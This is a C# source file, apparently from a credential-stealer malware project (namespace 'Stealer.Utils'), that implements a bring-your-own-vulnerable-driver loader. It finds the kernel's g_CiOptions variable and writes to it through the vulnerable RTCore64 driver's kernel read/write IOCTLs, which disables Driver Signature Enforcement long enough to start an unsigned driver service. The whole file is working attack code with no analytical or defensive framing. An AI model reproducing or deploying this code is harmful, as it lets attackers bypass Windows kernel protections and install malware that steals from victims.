using System;
using System.IO;
using System.Runtime.InteropServices;

namespace Stealer.Utils
{
    internal static class BYOVDLoader
    {
        // ── Win32 / Native APIs ────────────────────────────────────────────────

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtQuerySystemInformation(
            int SystemInformationClass,
            IntPtr SystemInformation,
            int SystemInformationLength,
            out int ReturnLength);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr LoadLibraryEx(string lpFileName, IntPtr hFile, uint dwFlags);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FreeLibrary(IntPtr hModule);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr CreateFile(
            string lpFileName, uint dwAccess, uint dwShare,
            IntPtr lpSA, uint dwCreation, uint dwFlags, IntPtr hTemplate);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool DeviceIoControl(
            IntPtr hDev, uint dwCode,
            IntPtr lpIn, int nIn,
            IntPtr lpOut, int nOut,
            out int lpBytesReturned, IntPtr lpOverlapped);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool StartService(IntPtr hSvc, uint argc, string[] argv);

        // ── Structs ─────────────────────────────────────────────────────────────

        [StructLayout(LayoutKind.Sequential)]
        private struct SYSTEM_MODULE_INFORMATION_ENTRY
        {
            public IntPtr Section;
            public IntPtr MappedBase;
            public IntPtr ImageBase;
            public uint ImageSize;
            public uint Flags;
            public ushort LoadOrderIndex;
            public ushort InitOrderIndex;
            public ushort LoadCount;
            public ushort OffsetToFileName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string FullPathName;
        }

        // RTCore64 IOCTL struct
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct RTCORE64_READ_WRITE
        {
            public uint Unknown1;
            public ulong Address;
            public uint Unknown2;
            public uint Size;
            public uint Value;
            public uint Unknown3;
        }

        private const uint DONT_RESOLVE_DLL_REFERENCES = 0x00000001;
        private const int SystemModuleInformation = 11;
        private const uint GENERIC_READ_WRITE = 0xC0000000;
        private const uint FILE_SHARE_READ_WRITE = 3;
        private const uint OPEN_EXISTING = 3;

        // RTCore64 IOCTLs
        private const uint RTCORE64_READ_IOCTL  = 0x80002048;
        private const uint RTCORE64_WRITE_IOCTL = 0x8000204C;

        // ── Public API ──────────────────────────────────────────────────────────

        public static bool DisableDSEAndStartService(IntPtr hSvc)
        {
            try
            {
                IntPtr gCiOptionsKernelAddr = FindGCiOptionsAddress();
                if (gCiOptionsKernelAddr == IntPtr.Zero)
                    return false;

                // Read original g_CiOptions
                uint originalOptions = ReadKernelMemory32(gCiOptionsKernelAddr);

                // Write 0 to disable DSE
                if (!WriteKernelMemory32(gCiOptionsKernelAddr, 0))
                    return false;

                bool started = false;
                try
                {
                    started = StartService(hSvc, 0, null);
                    if (!started && Marshal.GetLastWin32Error() == 1056)
                    {
                        started = true;
                    }
                }
                finally
                {
                    // Restore original g_CiOptions value if read was valid
                    if (originalOptions != 0)
                    {
                        WriteKernelMemory32(gCiOptionsKernelAddr, originalOptions);
                    }
                    else
                    {
                        WriteKernelMemory32(gCiOptionsKernelAddr, 6);
                    }
                }

                return started;
            }
            catch
            {
                return false;
            }
        }

        // ── Helper Methods ──────────────────────────────────────────────────────

        private static IntPtr FindGCiOptionsAddress()
        {
            IntPtr ciKernelBase = GetKernelModuleBase("ci.dll");
            if (ciKernelBase == IntPtr.Zero)
                return IntPtr.Zero;

            string system32Path = Environment.GetFolderPath(Environment.SpecialFolder.System);
            string ciPath = Path.Combine(system32Path, "ci.dll");
            if (!File.Exists(ciPath)) return IntPtr.Zero;

            IntPtr userCiBase = LoadLibraryEx(ciPath, IntPtr.Zero, DONT_RESOLVE_DLL_REFERENCES);
            if (userCiBase == IntPtr.Zero) return IntPtr.Zero;

            try
            {
                IntPtr ciInitializeAddr = GetProcAddress(userCiBase, "CiInitialize");
                IntPtr gCiOptionsUserAddr = IntPtr.Zero;

                if (ciInitializeAddr != IntPtr.Zero)
                {
                    gCiOptionsUserAddr = ScanForGCiOptions(ciInitializeAddr, 0x100);
                }

                if (gCiOptionsUserAddr == IntPtr.Zero)
                {
                    gCiOptionsUserAddr = ScanModuleForGCiOptionsPattern(userCiBase);
                }

                if (gCiOptionsUserAddr == IntPtr.Zero) return IntPtr.Zero;

                long offset = (long)gCiOptionsUserAddr - (long)userCiBase;
                return new IntPtr((long)ciKernelBase + offset);
            }
            finally
            {
                FreeLibrary(userCiBase);
            }
        }

        private static IntPtr GetKernelModuleBase(string moduleName)
        {
            int size = 0;
            NtQuerySystemInformation(SystemModuleInformation, IntPtr.Zero, 0, out size);
            if (size == 0) return IntPtr.Zero;

            IntPtr buffer = Marshal.AllocHGlobal(size);
            try
            {
                if (NtQuerySystemInformation(SystemModuleInformation, buffer, size, out size) != 0)
                    return IntPtr.Zero;

                int moduleCount = Marshal.ReadInt32(buffer);
                IntPtr currentModule = new IntPtr(buffer.ToInt64() + 8); // Skip count on 64-bit alignment

                for (int i = 0; i < moduleCount; i++)
                {
                    SYSTEM_MODULE_INFORMATION_ENTRY entry =
                        (SYSTEM_MODULE_INFORMATION_ENTRY)Marshal.PtrToStructure(
                            currentModule, typeof(SYSTEM_MODULE_INFORMATION_ENTRY));

                    string name = Path.GetFileName(entry.FullPathName);
                    if (string.Equals(name, moduleName, StringComparison.OrdinalIgnoreCase))
                    {
                        return entry.ImageBase;
                    }

                    currentModule = new IntPtr(currentModule.ToInt64() + Marshal.SizeOf(typeof(SYSTEM_MODULE_INFORMATION_ENTRY)));
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }

            return IntPtr.Zero;
        }

        private static IntPtr ScanForGCiOptions(IntPtr baseAddr, int maxOffset)
        {
            byte[] code = new byte[maxOffset];
            Marshal.Copy(baseAddr, code, 0, maxOffset);

            for (int i = 0; i < maxOffset - 6; i++)
            {
                if ((code[i] == 0x89 || code[i] == 0x8B) && (code[i + 1] & 0xC7) == 0x05)
                {
                    int rel = BitConverter.ToInt32(code, i + 2);
                    IntPtr nextInstr = new IntPtr(baseAddr.ToInt64() + i + 6);
                    IntPtr target = new IntPtr(nextInstr.ToInt64() + rel);
                    return target;
                }
            }
            return IntPtr.Zero;
        }

        private static IntPtr ScanModuleForGCiOptionsPattern(IntPtr userBase)
        {
            IntPtr exportAddr = GetProcAddress(userBase, "CiFreePolicyInfo");
            if (exportAddr != IntPtr.Zero)
            {
                return ScanForGCiOptions(exportAddr, 0x80);
            }
            return IntPtr.Zero;
        }

        private static uint ReadKernelMemory32(IntPtr kernelAddr)
        {
            IntPtr hDev = CreateFile(@"\\.\RTCore64", GENERIC_READ_WRITE,
                FILE_SHARE_READ_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);

            if (hDev == IntPtr.Zero || hDev == new IntPtr(-1))
            {
                return 0;
            }

            try
            {
                RTCORE64_READ_WRITE req = new RTCORE64_READ_WRITE
                {
                    Address = (ulong)kernelAddr.ToInt64(),
                    Size = 4
                };

                int size = Marshal.SizeOf(req);
                IntPtr pReq = Marshal.AllocHGlobal(size);
                try
                {
                    Marshal.StructureToPtr(req, pReq, false);
                    int bytesReturned;
                    if (DeviceIoControl(hDev, RTCORE64_READ_IOCTL, pReq, size, pReq, size, out bytesReturned, IntPtr.Zero))
                    {
                        RTCORE64_READ_WRITE res = (RTCORE64_READ_WRITE)Marshal.PtrToStructure(pReq, typeof(RTCORE64_READ_WRITE));
                        return res.Value;
                    }
                }
                finally { Marshal.FreeHGlobal(pReq); }
            }
            finally { CloseHandle(hDev); }

            return 0;
        }

        private static bool WriteKernelMemory32(IntPtr kernelAddr, uint value)
        {
            IntPtr hDev = CreateFile(@"\\.\RTCore64", GENERIC_READ_WRITE,
                FILE_SHARE_READ_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);

            if (hDev == IntPtr.Zero || hDev == new IntPtr(-1))
            {
                return false;
            }

            try
            {
                RTCORE64_READ_WRITE req = new RTCORE64_READ_WRITE
                {
                    Address = (ulong)kernelAddr.ToInt64(),
                    Size = 4,
                    Value = value
                };

                int size = Marshal.SizeOf(req);
                IntPtr pReq = Marshal.AllocHGlobal(size);
                try
                {
                    Marshal.StructureToPtr(req, pReq, false);
                    int bytesReturned;
                    return DeviceIoControl(hDev, RTCORE64_WRITE_IOCTL, pReq, size, pReq, size, out bytesReturned, IntPtr.Zero);
                }
                finally { Marshal.FreeHGlobal(pReq); }
            }
            finally { CloseHandle(hDev); }
        }
    }
}
